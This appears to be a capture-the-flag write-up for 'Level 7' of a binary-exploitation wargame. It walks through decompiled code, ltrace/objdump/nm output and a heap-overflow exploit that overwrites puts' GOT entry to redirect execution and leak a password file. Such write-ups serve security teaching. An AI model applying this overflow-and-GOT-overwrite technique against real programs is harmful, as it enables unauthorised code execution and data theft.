# Level 7

## the code:

//----- (080484F4) --------------------------------------------------------
int m()
{
time_t v0; // eax

v0 = time(0);
return printf("%s - %d\n", c, v0);
}

//----- (08048521) --------------------------------------------------------
int \_\_cdecl main(int argc, const char **argv, const char **envp)
{
FILE *v3; // eax
void *v5; // [esp+18h] [ebp-8h]
void \*v6; // [esp+1Ch] [ebp-4h]

v6 = malloc(8u);
_(\_DWORD _)v6 = 1;
_((\_DWORD _)v6 + 1) = malloc(8u);
v5 = malloc(8u);
_(\_DWORD _)v5 = 2;
_((\_DWORD _)v5 + 1) = malloc(8u);
strcpy(_((char \*\*)v6 + 1), argv[1]);
strcpy(_((char \*\*)v5 + 1), argv[2]);
v3 = fopen("/home/user/level8/.pass", "r");
fgets(c, 68, v3);
puts("~~");
return 0;
}

## the goal

overwrite \*(v6+1) to put the GOT puts() address in v5+1
replace &puts() with &m()
don't work, fgets segfault before
rewrite c variable as stdout

## addresses

inside rainfall:

```sh
$ ltrace ./level7
__libc_start_main(0x8048521, 1, 0xbffff804, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

```sh
$ objdump -R ./level7

./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

on the local computer:

```sh
$ nm level7
08049940 A __bss_start
08049960 B c
08049940 b completed.6159
0804982c d __CTOR_END__
08049828 d __CTOR_LIST__
08049938 D __data_start
08049938 W data_start
08048690 t __do_global_ctors_aux
08048470 t __do_global_dtors_aux
0804993c D __dso_handle
08049834 D __DTOR_END__
08049944 b dtor_idx.6161
08049830 d __DTOR_LIST__
0804983c d _DYNAMIC
08049940 A _edata
080499b0 A _end
         U fgets@@GLIBC_2.0
080486bc T _fini
         U fopen@@GLIBC_2.1
080486d8 R _fp_hw
080484d0 t frame_dummy
08048824 r __FRAME_END__
08049908 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
08048682 T __i686.get_pc_thunk.bx
0804836c T _init
08049828 d __init_array_end
08049828 d __init_array_start
080486dc R _IO_stdin_used
08049838 d __JCR_END__
08049838 d __JCR_LIST__
         w _Jv_RegisterClasses
08048680 T __libc_csu_fini
08048610 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
080484f4 T m
08048521 T main
         U malloc@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
08048440 T _start
         U strcpy@@GLIBC_2.0
         U time@@GLIBC_2.0
```

argv1 will be copied at 0x0804a018
argv2 will be copied at the address stored at 0x0804a028 + 4 = 0x0804a02c
puts address stored at 0x08049928
m address is 0x080484f4
offset is 0x0804a02c - 0x0804a018 = 0x14 (20)

arg 1: "A" x 20 . "\x28\x99\x04\x08"
arg 2: "\xf4\x84\x04\x08

## the hack:

```sh
$ ./level7 $(perl -e 'print "A" x 20 . "\x28\x99\x04\x08"') $(perl -e 'print"\xf4\x84\x04\x08"')
```
